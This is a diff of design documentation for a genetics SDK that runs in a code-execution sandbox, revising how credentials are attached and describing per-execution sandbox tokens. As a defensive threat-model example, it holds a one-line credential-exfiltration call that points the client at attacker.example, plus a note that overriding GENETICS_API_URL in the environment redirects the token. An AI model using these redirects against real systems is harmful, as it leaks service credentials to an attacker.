@@ -622,16 +622,27 @@ carry — without it a script cannot canonicalise a user-supplied gene list befo
   tool layer's `{"success": False, "error": ...}` exists because a model reads the dict; a
   script author does not check a flag after every call, and an unchecked failure would
   otherwise read as an empty frame.
-- **No knowledge of HTTP required, and no way to redirect it.** Endpoints come from the
-  environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`) and
-  credentials from `INTERNAL_API_SECRET`. Neither `configure()` nor `GeneticsClient()` accepts
-  a URL: the client attaches the internal bearer token to **both** the results-api and the
-  db-api client, so a caller-supplied base URL would be a one-line credential exfiltration
-  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`).
-  `configure()` raises `GeneticsUsageError` on any URL setting. **This is a mitigation, not the
-  answer** — per `genetics-results-suite/docs/code-execution-security.md`, a script that can
-  `import` the SDK can also read `os.environ`, so the sandboxed SDK must eventually carry a
-  short-lived scoped token rather than `INTERNAL_API_SECRET` at all (tasks `.9` / `.14`).
+- **No knowledge of HTTP required, and endpoints are not a parameter.** Endpoints come from
+  the environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`).
+  Credentials depend on where the SDK is running: **inside the sandbox** it attaches the
+  per-execution token pair the supervisor named to the child by path in `SANDBOX_TOKEN_FILE`,
+  per request and bound to the destination's audience, and never `INTERNAL_API_SECRET`
+  (`genetics-results-suite-4h6.44`, landed; `tools/executor.py` `_load_sandbox_tokens` /
+  `_SandboxTokenAuth`); **outside it** — the service processes and local runs — it attaches
+  `INTERNAL_API_SECRET`. The two are mutually exclusive with no fallback, because the shared
+  secret satisfies `is_internal_caller` and is served with no per-execution accounting at all
+  (`genetics-results-suite-0lf`). A pruned (sandbox) install that reaches client construction
+  with neither raises rather than sending requests unauthenticated.
+  Neither `configure()` nor `GeneticsClient()` accepts a URL, since the client credentials
+  every request to whatever base URL it holds
+  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`);
+  `configure()` raises `GeneticsUsageError` on any URL setting. **That is tidiness, not a
+  boundary, and must not be cited as one**: the sandbox child is forked without exec, so the
+  script owns `os.environ` too, and setting `GENETICS_API_URL` before the SDK's first use
+  (the URL reads are `cached_property`, and `sdk/__init__` holds `_client = None` until then)
+  redirects the client and takes the token with it — measured. What contains a hostile script
+  is the sandbox's deny-by-default egress allow-list plus `genetics-results-suite-4h6.55`; the
+  per-execution token's value is that it is short-lived, audience-scoped and **attributable**.
   `_download_url` / `_download_data` are dropped — a script already holds the rows.
 - **No inline row cap.** `ToolExecutor._row_limit` caps region results at 500 to protect the
   model's context window; `GeneticsClient` passes `row_limit=None` to the executor **it
@@ -1554,7 +1565,8 @@ All configuration is via environment variables (`.env` file supported):
 | Variable | Description | Default |
 |----------|-------------|---------|
 | `GENETICS_PUBLIC_API_URL` | Externally reachable base URL used when building download links shown to users; falls back to `GENETICS_API_URL`, which in a cluster is an internal address | `GENETICS_API_URL` |
-| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info; the pruned sandbox install holds none by design and is exempt | - |
+| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info. The pruned sandbox install holds none by design and uses `SANDBOX_TOKEN_FILE` instead; since `genetics-results-suite-4h6.44` it is no longer exempt from needing *a* credential — a pruned install with neither raises `SandboxCredentialError` at client construction | - |
+| `SANDBOX_TOKEN_FILE` | Path (never the tokens) to the per-execution token file the sandbox supervisor writes before it forks — a JSON object keyed by audience, `{"db-api": ..., "results-api": ...}`. Read **once** and unlinked on the first client build (`tools/executor.py`), then attached per request bound to the destination's audience; mutually exclusive with `INTERNAL_API_SECRET`, and a file that does not yield a usable pair raises rather than degrading to no credential. Set only by the supervisor in the sandbox image; unset everywhere else. Read-once-and-unlink is **not** an exposure bound — see `genetics-results-suite-4h6.55` | - |
 | `CHAT_BACKEND_URL` | Base URL of the chat backend, used by the MCP server to validate per-user API tokens via `POST /v1/tokens/validate` when the two services do not share a filesystem. Authenticated with `INTERNAL_API_SECRET` | - |
 | `SANDBOX_URL` | Base URL of the code-execution sandbox supervisor. **One value, deliberately** — it names the in-cluster Service in production and the local Docker container in development, and `sandbox_client.py` branches on nothing else, because the wire contract is identical in both deployments | `http://127.0.0.1:8080` |
 | `SANDBOX_TOKEN_SIGNING_KEY` | HS256 key for the per-execution sandbox tokens, held only by chat-backend (mint) and db-api/results-api (verify). Separate from `INTERNAL_API_SECRET` on purpose: separate blast radius, independent rotation, and the sandbox holds neither. Unset means **no execution runs** — `mint_execution_tokens` raises `SandboxTokenUnavailable` rather than returning `None`, since every fallback is either "send no credential" or "send the shared secret" | - |
